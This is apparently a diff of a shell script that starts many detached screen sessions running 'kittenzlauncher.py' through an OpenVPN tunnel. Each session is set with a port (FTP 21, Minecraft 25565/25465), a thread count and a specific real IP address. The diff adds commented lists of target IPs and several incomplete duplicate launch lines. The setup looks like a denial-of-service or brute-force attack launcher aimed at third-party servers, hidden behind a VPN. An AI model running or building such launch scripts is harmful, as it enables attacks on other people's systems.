@@ -29,7 +29,16 @@ screen -dmS vpn openvpn --config $config
 #screen -dmS p python /kittenzlauncher.py -p 25465 -t 50 45.35.54.55
 #screen -dmS q python /kittenzlauncher.py -p 25465 -t 50 45.35.54.57
 #screen -dmS r python /kittenzlauncher.py -p 25465 -t 50 45.35.54.118
-
+#172.106.202.6#mpg
+#172.106.202.10
+#172.106.202.29
+#172.106.202.33
+#172.106.202.36
+#172.106.202.45#mpg
+#172.106.202.46
+#172.106.202.82
+#172.106.202.84
+#172.106.202.117
 
 #ftp
 screen -dmS s python /kittenzlauncher.py -p 21 -t 100 107.174.19.150
@@ -57,6 +66,17 @@ screen -dmS nn python /kittenzlauncher.py -p 21 -t 100 45.35.54.57
 screen -dmS oo python /kittenzlauncher.py -p 21 -t 100 45.35.54.77
 screen -dmS pp python /kittenzlauncher.py -p 21 -t 100 45.35.54.118
 
+screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
+screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
+screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
+screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
+screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
+screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
+screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
+screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
+screen -dmS hh python /kittenzlauncher.py -p 21 -t 100 
+
+
 screen -dmS mc1 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.3
 screen -dmS mc2 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.38
 screen -dmS mc3 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.55
@@ -74,4 +94,18 @@ screen -dmS mc9 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.112
 screen -dmS mc10 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.113
 screen -dmS mc11 python /kittenzlauncher.py -p 25565 -t 100 45.35.54.114
 
+#172.106.202.117
+#172.106.202.118
+#172.106.202.119
+#172.106.202.120
+#172.106.202.123
+#172.106.202.43
+#172.106.202.45
+#172.106.202.46
+#172.106.202.34
+#172.106.202.33
+#172.106.202.29
+#172.106.202.13
+#172.106.202.82
+#172.106.202.84
 
